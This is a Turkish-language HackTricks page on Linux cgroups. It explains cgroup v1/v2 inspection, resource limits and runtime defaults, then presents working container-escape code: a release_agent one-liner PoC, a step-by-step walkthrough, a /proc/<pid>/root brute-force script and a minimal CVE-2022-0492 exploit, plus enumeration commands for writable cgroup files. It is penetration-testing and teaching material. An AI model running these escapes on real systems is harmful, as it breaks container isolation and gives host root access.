# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## Genel Bakış

Linux **control groups**, süreçleri accounting, limiting, prioritization ve policy enforcement amacıyla birlikte gruplamak için kullanılan kernel mekanizmasıdır. Namespace'ler temel olarak kaynakların görünümünü izole etmeye odaklanırken, cgroups temel olarak bir süreç kümesinin bu kaynakların **ne kadarını** tüketebileceğini ve bazı durumlarda **hangi kaynak sınıflarıyla** etkileşime girebileceğini yönetmeye odaklanır. Container'lar, kullanıcı bunlara doğrudan hiç bakmasa bile cgroups'a sürekli olarak güvenir; çünkü neredeyse her modern runtime, kernel'e "bu süreçler bu workload'a ait ve bunlara uygulanacak kaynak kuralları bunlar" demenin bir yoluna ihtiyaç duyar.

Container engine'lerinin yeni bir container'ı kendi cgroup subtree'sine yerleştirmesinin nedeni budur. Süreç ağacı oraya yerleştirildiğinde runtime; memory kullanımını sınırlandırabilir, PID sayısını kısıtlayabilir, CPU kullanımına ağırlık verebilir, I/O'yu düzenleyebilir ve device erişimini kısıtlayabilir. Production environment'ta bu, hem multi-tenant güvenliği hem de basit operational hygiene açısından kritik öneme sahiptir. Anlamlı resource control'lere sahip olmayan bir container; memory'yi tüketebilir, sistemi süreçlerle doldurabilir veya CPU ve I/O'yu host'u ya da komşu workload'ları kararsızlaştıracak şekilde tekeline alabilir.

Security perspective açısından cgroups iki ayrı nedenle önemlidir. Birincisi, kötü veya eksik resource limit'leri doğrudan denial-of-service saldırılarına olanak tanır. İkincisi, bazı cgroup özellikleri, özellikle eski **cgroup v1** kurulumlarında, container içinden yazılabilir olduklarında tarihsel olarak güçlü breakout primitive'leri oluşturmuştur.

## v1 ve v2

Kullanımda olan iki büyük cgroup modeli vardır. **cgroup v1**, birden fazla controller hierarchy sunar ve eski exploit writeup'ları genellikle burada bulunan garip ve bazen gereğinden fazla güçlü semantics etrafında şekillenir. **cgroup v2** daha unified bir hierarchy ve genel olarak daha temiz bir davranış sunar. Modern distribution'lar giderek cgroup v2'yi tercih etmektedir; ancak mixed veya legacy environment'lar hâlâ mevcuttur. Bu da gerçek sistemleri incelerken her iki modelin de hâlâ ilgili olduğu anlamına gelir.

Bu fark önemlidir; çünkü **`release_agent`** gibi cgroup v1 abuse'ları da dahil olmak üzere en ünlü container breakout hikâyelerinden bazıları, eski cgroup davranışıyla çok özel bir şekilde ilişkilidir. Bir blog'da cgroup exploit'i gören ve ardından bunu modern, yalnızca cgroup v2 kullanan bir sisteme düşünmeden uygulayan bir okuyucunun, hedefte gerçekte nelerin mümkün olduğunu yanlış anlaması muhtemeldir.

## İnceleme

Mevcut shell'inizin nerede bulunduğunu görmenin en hızlı yolu şudur:
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
`/proc/self/cgroup` dosyası, mevcut process ile ilişkilendirilmiş cgroup yollarını gösterir. Modern bir cgroup v2 host üzerinde genellikle unified bir giriş görürsünüz. Daha eski veya hybrid hostlarda birden fazla v1 controller yolu görebilirsiniz. Yolu öğrendikten sonra, limitleri ve mevcut kullanımı görmek için `/sys/fs/cgroup` altındaki ilgili dosyaları inceleyebilirsiniz.

Bir cgroup v2 host üzerinde aşağıdaki komutlar kullanışlıdır:
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
Bu dosyalar hangi controller'ların mevcut olduğunu ve hangilerinin child cgroup'lara devredildiğini gösterir. Bu delegation modeli, rootless ve systemd tarafından yönetilen ortamlarda önemlidir; runtime yalnızca parent hierarchy tarafından gerçekten devredilen cgroup işlevlerinin alt kümesini kontrol edebilir.

## Lab

cgroup'ları pratikte gözlemlemenin bir yolu, memory-limited bir container çalıştırmaktır:
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
PID sınırlı bir container da deneyebilirsiniz:
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
Bu örnekler kullanışlıdır çünkü runtime flag'ini kernel file interface'e bağlamaya yardımcı olurlar. Runtime kuralı sihirli bir şekilde uygulamaz; ilgili cgroup ayarlarını yazar ve ardından kernel'in bunları process tree'ye karşı uygulamasına izin verir.

## Runtime Kullanımı

Docker, Podman, containerd ve CRI-O, normal çalışma süreçlerinin bir parçası olarak cgroups'a güvenir. Aralarındaki farklar genellikle cgroups kullanıp kullanmadıklarıyla değil, **hangi varsayılanları seçtikleri**, **systemd ile nasıl etkileşim kurdukları**, **rootless delegation'ın nasıl çalıştığı** ve **konfigürasyonun ne kadarının engine seviyesinde, ne kadarının orchestration seviyesinde kontrol edildiği** ile ilgilidir.

Kubernetes'te resource requests ve limits, sonunda node üzerindeki cgroup konfigürasyonuna dönüşür. Pod YAML'dan kernel enforcement'a giden yol kubelet, CRI runtime ve OCI runtime üzerinden geçer; ancak kuralı nihayetinde uygulayan kernel mekanizması yine cgroups'tur. Incus/LXC ortamlarında da cgroups yoğun şekilde kullanılır; bunun başlıca nedeni system containers'ın genellikle daha zengin bir process tree sunması ve daha çok VM benzeri operasyonel beklentilere sahip olmasıdır.

## Misconfigurations And Breakouts

Klasik cgroup security hikayesi, yazılabilir **cgroup v1 `release_agent`** mekanizmasıdır. Bu modelde attacker doğru cgroup dosyalarına yazabilir, `notify_on_release` özelliğini etkinleştirebilir ve `release_agent` içinde tutulan path'i kontrol edebilirse, cgroup boşaldığında kernel host üzerindeki initial namespaces içinde attacker tarafından seçilen bir path'i çalıştırabilir. Bu nedenle eski writeup'lar cgroup controller writability, mount options ve namespace/capability koşullarına bu kadar fazla önem verir.

`release_agent` kullanılabilir olmadığında bile cgroup hataları önemini korur. Aşırı geniş device access, host device'larının container'dan erişilebilir olmasına neden olabilir. Memory ve PID limitlerinin eksik olması, basit bir code execution'ı host DoS saldırısına dönüştürebilir. Rootless senaryolardaki zayıf cgroup delegation da runtime'ın kısıtlamayı gerçekte hiçbir zaman uygulayamadığı durumlarda defender'ların bir kısıtlamanın mevcut olduğunu varsaymasına yol açabilir.

### `release_agent` Arka Planı

`release_agent` tekniği yalnızca **cgroup v1** için geçerlidir. Temel fikir, bir cgroup içindeki son process çıktığında ve `notify_on_release=1` ayarlandığında, kernel'in path'i `release_agent` içinde tutulan programı çalıştırmasıdır. Bu çalıştırma **host üzerindeki initial namespaces** içinde gerçekleşir; yazılabilir bir `release_agent`'ı container escape primitive'ine dönüştüren de budur.

Tekniğin çalışması için attacker genellikle şunlara ihtiyaç duyar:

- yazılabilir bir **cgroup v1** hierarchy
- bir child cgroup oluşturma veya kullanma yeteneği
- `notify_on_release` ayarlama yeteneği
- `release_agent` içine bir path yazma yeteneği
- host'un bakış açısından executable olarak çözümlenen bir path

### Classic PoC

Tarihsel one-liner PoC şöyledir:
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
Bu PoC, `release_agent` içine bir payload yolu yazar, cgroup release işlemini tetikler ve ardından host üzerinde oluşturulan çıktı dosyasını okur.

### Okunabilir Adım Adım Açıklama

Aynı fikir adımlara ayrıldığında daha kolay anlaşılır.

1. Yazılabilir bir cgroup oluşturun ve hazırlayın:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. Container filesystem'a karşılık gelen host path'i belirleyin:
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. Host path üzerinden görünür olacak bir payload bırakın:
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. cgroup'u boş hale getirerek yürütmeyi tetikleyin:
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
Etkisi, payload’un host tarafında host root ayrıcalıklarıyla yürütülmesidir. Gerçek bir exploit’te payload genellikle bir kanıt dosyası yazar, bir reverse shell başlatır veya host durumunu değiştirir.

### `/proc/<pid>/root` Kullanılarak Relative Path Varyantı

Bazı ortamlarda container dosya sisteminin host path’i belirgin değildir veya storage driver tarafından gizlenir. Bu durumda payload path’i, mevcut container içindeki bir prosese ait host PID olan `<pid>` üzerinden `/proc/<pid>/root/...` biçiminde ifade edilebilir. Relative-path brute-force varyantının temeli budur:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
Buradaki asıl trick brute force işleminin kendisi değil, path biçimidir: `/proc/<pid>/root/...`, kernel'ın host namespace içinden container filesystem içindeki bir dosyayı çözümlemesini sağlar; doğrudan host storage path önceden bilinmese bile.

### CVE-2022-0492 Varyantı

2022'de CVE-2022-0492, cgroup v1 içindeki `release_agent` değerine yazma işleminin **initial** user namespace içinde `CAP_SYS_ADMIN` kontrolünü doğru şekilde yapmadığını gösterdi. Bu durum, tekniği vulnerable kernel'larda çok daha erişilebilir hâle getirdi; çünkü bir cgroup hierarchy mount edebilen container process'i, host user namespace içinde önceden privileged olmadan `release_agent` değerine yazabiliyordu.

Minimal exploit:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
Güvenlik açığı bulunan bir kernel üzerinde host, `/proc/self/exe` dosyasını host root ayrıcalıklarıyla çalıştırır.

Pratik kötüye kullanım için öncelikle ortamın hâlâ yazılabilir cgroup-v1 yollarını veya tehlikeli device erişimini açığa çıkarıp çıkarmadığını kontrol edin:
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
`release_agent` mevcut ve yazılabilirse, zaten legacy-breakout alanındasınız:
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
cgroup path'in kendisi bir escape sağlamıyorsa, sonraki pratik kullanım çoğunlukla denial of service veya reconnaissance'tır:
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
Bu komutlar, iş yükünün fork-bomb çalıştırmak, agresif şekilde bellek tüketmek veya yazılabilir bir legacy cgroup arayüzünü kötüye kullanmak için alanı olup olmadığını hızlıca gösterir.

## Kontroller

Bir hedefi incelerken cgroup kontrollerinin amacı, hangi cgroup modelinin kullanıldığını, container'ın yazılabilir controller yollarını görüp görmediğini ve `release_agent` gibi eski breakout primitive'lerinin gerçekten geçerli olup olmadığını öğrenmektir.
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
Burada ilgi çekici olanlar:

- `mount | grep cgroup` çıktısı **cgroup v1** gösteriyorsa, eski breakout writeup'ları daha ilgili hâle gelir.
- `release_agent` mevcutsa ve erişilebilirse, bu durum derhâl daha derin bir incelemeye değerdir.
- Görünür cgroup hiyerarşisi yazılabilirse ve container aynı zamanda güçlü capabilities içeriyorsa, ortam çok daha yakından incelenmelidir.

**cgroup v1**, yazılabilir controller mount'ları ve güçlü capabilities ya da zayıf seccomp/AppArmor korumasına sahip bir container keşfederseniz, bu kombinasyon dikkatle ele alınmalıdır. cgroups genellikle sıkıcı bir kaynak yönetimi konusu olarak görülür, ancak geçmişte en öğretici container escape zincirlerinden bazılarının parçası olmuşlardır; bunun temel nedeni, "kaynak kontrolü" ile "host etkisi" arasındaki sınırın insanların varsaydığı kadar temiz olmamasıdır.

## Çalışma Zamanı Varsayılanları

| Runtime / platform | Varsayılan durum | Varsayılan davranış | Yaygın manuel zayıflatma |
| --- | --- | --- | --- |
| Docker Engine | Varsayılan olarak etkin | Container'lar otomatik olarak cgroups içine yerleştirilir; `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight` flag'leriyle ayarlanmadıkça kaynak limitleri isteğe bağlıdır | `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight` seçeneklerini belirtmemek; `--device`; `--privileged` |
| Podman | Varsayılan olarak etkin | `--cgroups=enabled` varsayılandır; cgroup namespace varsayılanları cgroup sürümüne göre değişir (cgroup v2'de `private`, bazı cgroup v1 kurulumlarında `host`) | `--cgroups=disabled`, `--cgroupns=host`, gevşetilmiş device erişimi, `--privileged` |
| Kubernetes | Runtime üzerinden varsayılan olarak etkin | Pod'lar ve container'lar node runtime tarafından cgroups içine yerleştirilir; ayrıntılı kaynak kontrolü `resources.requests` / `resources.limits` değerlerine bağlıdır | Kaynak request/limit değerlerini belirtmemek, ayrıcalıklı device erişimi, host-level runtime yanlış yapılandırması |
| containerd / CRI-O | Varsayılan olarak etkin | cgroups, normal lifecycle yönetiminin bir parçasıdır | Device kontrollerini gevşeten veya eski yazılabilir cgroup v1 arayüzlerini açığa çıkaran doğrudan runtime yapılandırmaları |

Önemli ayrım şudur: **cgroup varlığı** genellikle varsayılandır; buna karşılık **kullanışlı kaynak kısıtlamaları**, açıkça yapılandırılmadıkça çoğu zaman isteğe bağlıdır.
{{#include ../../../../banners/hacktricks-training.md}}
